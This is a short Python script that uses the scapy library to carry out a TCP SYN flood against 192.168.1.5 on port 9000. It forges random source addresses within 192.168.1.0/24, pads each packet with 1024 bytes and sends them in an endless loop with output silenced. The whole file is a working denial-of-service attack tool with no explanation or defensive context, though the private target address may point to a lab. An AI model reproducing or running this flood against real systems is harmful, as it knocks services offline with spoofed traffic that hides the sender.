from scapy.all import *

target_ip =  "192.168.1.5"  #target ip
target_port = 9000

ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"X"*1024)

p = ip / tcp / raw

send(p, loop=1, verbose=0)